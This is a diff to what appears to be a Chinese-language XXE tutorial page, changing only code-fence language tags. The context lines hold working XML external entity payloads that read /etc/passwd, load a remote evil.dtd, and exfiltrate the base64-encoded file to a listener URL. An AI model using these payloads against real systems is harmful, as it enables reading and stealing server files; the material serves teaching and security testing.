@@ -28,13 +28,13 @@ lightgallery: false
 
 SYSTEM
 
-```xml-dtd
+```dtd
 <!ENTITY xxs SYSTEM "file:///etc/passwd" >
 ```
 
 PUBLIC
 
-```xml-dtd
+```dtd
 <!ENTITY % remote PUBLIC "dtd" "http://127.0.0.1/evil.dtd">
 ```
 
@@ -42,7 +42,7 @@ PUBLIC
 
 通用实体
 
-```xml-dtd
+```dtd
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE test [
 <!ENTITY file SYSTEM "file:///etc/passwd">]>
@@ -53,7 +53,7 @@ PUBLIC
 
 参数实体 (利用 CDATA)
 
-```xml-dtd
+```dtd
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE test [
 <!ENTITY % start "<![CDATA[">
@@ -68,7 +68,7 @@ PUBLIC
 
 evil.dtd
 
-```xml-dtd
+```dtd
 <?xml version="1.0" encoding="utf-8"?>
 <!ENTITY all "%start;%xxe;%end;" >
 ```
@@ -77,7 +77,7 @@ evil.dtd
 
 payload
 
-```xml-dtd
+```dtd
 <!DOCTYPE test [
 <!ENTITY % remote SYSTEM "http://127.0.0.1/evil.dtd">
 %remote;%int;%send;
@@ -86,7 +86,7 @@ payload
 
 evil.dtd
 
-```xml-dtd
+```dtd
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://127.0.0.1/?p=%file;'>">
 ```
